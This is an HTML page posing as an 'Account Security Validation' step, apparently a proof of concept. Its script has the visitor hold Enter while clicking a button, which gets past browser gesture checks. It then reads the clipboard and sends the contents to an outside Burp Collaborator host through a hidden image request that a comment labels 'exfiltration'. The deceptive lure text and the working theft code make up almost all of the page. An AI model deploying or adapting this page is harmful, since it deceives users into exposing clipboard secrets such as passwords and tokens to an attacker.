<!DOCTYPE html>
<html>
<head>
  <title>Secure Validation</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding-top: 100px;
    }
    button {
      padding: 12px 24px;
      font-size: 18px;
      margin-top: 30px;
      cursor: pointer;
    }
    #msg {
      margin-top: 20px;
      font-size: 16px;
    }
    #result {
      margin-top: 20px;
      font-weight: bold;
      color: green;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>

  <h2>Account Security Validation</h2>
  <div id="msg">üîê Press the ENTER key to begin verification</div>
  <button id="btn" style="display:none;">Continue Verification</button>
  <div id="result"></div>

  <script>
    let stage = 0;
    let triggered = false;
    let enterHeld = false;

    document.addEventListener("keydown", (e) => {
      if (e.key !== "Enter") return;

      if (stage === 0) {
        stage = 1;
        document.getElementById("msg").innerText = "‚¨áÔ∏è Now press and hold ENTER while clicking the button below";
        document.getElementById("btn").style.display = "inline-block";
      }

      if (stage === 1) {
        enterHeld = true;
      }
    });

    document.addEventListener("keyup", (e) => {
      if (e.key === "Enter") {
        enterHeld = false;
      }
    });

    document.getElementById("btn").addEventListener("click", () => {
      if (stage === 1 && enterHeld && !triggered) {
        triggered = true;
        document.getElementById("msg").innerText = "üìã Reading clipboard...";

        navigator.clipboard.readText()
          .then(text => {
            document.getElementById("result").innerText = "üìã Clipboard contains:\n" + text;

            // Optional: exfiltration
            const img = new Image();
            img.src = "https://7lt06qlfukri71j8ui2scllc238vwk.burpcollaborator.net/log?clip=" + encodeURIComponent(text);

            document.getElementById("msg").innerText = "‚úÖ Verification complete.";
          })
          .catch(err => {
            document.getElementById("msg").innerText = "‚ùå Failed to read clipboard: " + err;
          });
      } else if (!enterHeld) {
        document.getElementById("msg").innerText = "‚ö†Ô∏è Please press and hold ENTER while clicking the button!";
      }
    });
  </script>

</body>
</html>
